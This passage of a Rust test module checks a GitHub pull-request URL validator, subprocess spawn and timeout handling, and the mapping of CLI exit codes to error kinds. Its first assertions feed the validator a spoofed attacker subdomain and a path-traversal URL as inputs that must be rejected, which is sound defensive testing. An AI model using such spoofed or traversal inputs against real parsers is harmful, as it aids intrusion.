        assert!(!is_github_pr_url("https://github.com/foo/bar/pull/0"));
        // Subdomain / suffix smuggling
        assert!(!is_github_pr_url("https://api.github.com/foo/bar/pull/1"));
        assert!(!is_github_pr_url("https://github.com.attacker.io/foo/bar/pull/1"));
        // Path traversal characters
        assert!(!is_github_pr_url("https://github.com/foo/../etc/pull/1"));
    }

    #[test]
    fn invoke_packet_post_returns_spawn_error_on_missing_binary() {
        let result = invoke_packet_post(
            "/nonexistent/binary/cannot-exist",
            "/tmp/packet.yml",
            None,
            "tester",
            Duration::from_secs(2),
        );
        let err = result.expect_err("spawn must fail for absent binary");
        assert_eq!(err.kind, PacketOpErrorKind::Spawn);
    }

    #[test]
    fn invoke_packet_decide_returns_spawn_error_on_missing_binary() {
        let result = invoke_packet_decide(
            "/nonexistent/binary/cannot-exist",
            "/tmp/packet.yml",
            None,
            "CLAIM-001",
            "block",
            Some("breaks build"),
            "tester",
            Duration::from_secs(2),
        );
        let err = result.expect_err("spawn must fail for absent binary");
        assert_eq!(err.kind, PacketOpErrorKind::Spawn);
    }

    #[test]
    fn invoke_packet_post_classifies_non_zero_exit() {
        // `false` exits 1 with no stderr; classification falls through to
        // Other (no keyword match). The kind discriminant is what the IPC
        // layer surfaces; the exit code is captured for evidence.
        let result = invoke_packet_post(
            "false",
            "/tmp/packet.yml",
            None,
            "tester",
            Duration::from_secs(2),
        );
        let err = result.expect_err("false must report non-zero exit");
        assert_eq!(err.kind, PacketOpErrorKind::Other);
        assert_eq!(err.exit_code, Some(1));
    }

    #[test]
    fn spawn_with_timeout_returns_timeout_on_long_running_subprocess() {
        // `sleep 5` is too long for a 200ms timeout; the bridge must kill
        // the child and return Timeout. Verifies the gh hangup safety
        // net for a stalled `gh auth login` etc.
        let result = spawn_with_timeout("sleep", &["5"], Duration::from_millis(200));
        match result {
            Err(BridgeError::Timeout(_)) => {}
            other => panic!("expected Timeout, got {other:?}"),
        }
    }

    // --- Sprint 6 (gh#13 AC-4 F5 fold): pin Phase 3b exit-7 → kind mapping.
    //
    // The classifier maps exit codes 1:1 to PacketOpErrorKind. Exit 7
    // (NETWORK_OR_RATE_LIMIT) is the shared bucket for both genuine
    // network failures and HTTP 403/429 rate-limit responses; the Rust
    // classifier returns NetworkOrRateLimit purely on the exit code,
    // regardless of stderr content. The UI then disambiguates via stderr
    // keyword sniffing in `apps/ui/src/services/gh-post.ts::classifyGhError`
    // for affordance-level messaging ("wait + retry" vs "check connection").
    //
    // CYCLE-1.5 F4 (PR #21): the four tests below are NAMED for the stderr
    // keyword shape the UI consumes, but their assertion power is the
    // exit-code-pinning of NetworkOrRateLimit — they would all pass with
    // empty stderr. Tests retained because pinning the exit-7 → kind map
    // for representative real-world stderr fragments is the contract the
    // UI relies on; the names below document the stderr fragments that
    // the UI's classifyGhError sniffs, so a future renumber of EXIT_*
    // constants can't silently break the UI's affordance branching.

    #[test]
    fn classify_packet_op_failure_exit_7_pins_network_or_rate_limit_for_rate_limit_stderr() {
        let kind = classify_packet_op_failure(EXIT_NETWORK_OR_RATE_LIMIT, "rate limit exceeded");
        assert_eq!(kind, PacketOpErrorKind::NetworkOrRateLimit);
    }

    #[test]
    fn classify_packet_op_failure_exit_7_pins_network_or_rate_limit_for_http_403_stderr() {
        // GitHub returns HTTP 403 with stderr like "API rate limit exceeded for ...".
        let kind =
            classify_packet_op_failure(EXIT_NETWORK_OR_RATE_LIMIT, "HTTP 403: API rate limit");
        assert_eq!(kind, PacketOpErrorKind::NetworkOrRateLimit);
    }

    #[test]
    fn classify_packet_op_failure_exit_7_pins_network_or_rate_limit_for_http_429_stderr() {
        // GitHub also returns HTTP 429 for secondary rate limits.
        let kind = classify_packet_op_failure(
            EXIT_NETWORK_OR_RATE_LIMIT,
            "HTTP 429 Too Many Requests",
        );
        assert_eq!(kind, PacketOpErrorKind::NetworkOrRateLimit);
    }

    #[test]
    fn classify_packet_op_failure_exit_7_pins_network_or_rate_limit_independent_of_stderr() {
        // The exit code alone is sufficient — rate-limit-specific stderr
        // is the UI's affordance for showing a "wait + retry" message,
        // but the Rust classifier doesn't gate on it. This test makes
        // that exit-code-only contract explicit (vs the three above
        // which document the representative stderr fragments).
        let kind = classify_packet_op_failure(EXIT_NETWORK_OR_RATE_LIMIT, "connection refused");
        assert_eq!(kind, PacketOpErrorKind::NetworkOrRateLimit);
    }

    #[test]
    fn classify_packet_op_failure_exit_1_with_no_such_file_keyword_is_packet_not_found() {
        // Exit 1 is the catch-all; the keyword sniff refines for "no
        // such file" → PacketNotFound (a known kind) rather than
        // Other. Documented in the function's body comment.
        let kind = classify_packet_op_failure(
            EXIT_GENERIC,
            "Error: ENOENT: no such file or directory",
        );
        assert_eq!(kind, PacketOpErrorKind::PacketNotFound);
    }

    #[test]
    fn classify_packet_op_failure_exit_1_with_packet_not_found_keyword_is_packet_not_found() {
        let kind = classify_packet_op_failure(EXIT_GENERIC, "packet not found at /tmp/x.yml");
        assert_eq!(kind, PacketOpErrorKind::PacketNotFound);
    }

    #[test]
    fn classify_packet_op_failure_exit_1_with_other_keyword_falls_through_to_other() {
        let kind = classify_packet_op_failure(EXIT_GENERIC, "unexpected error: yaml parse");
        assert_eq!(kind, PacketOpErrorKind::Other);
    }
}
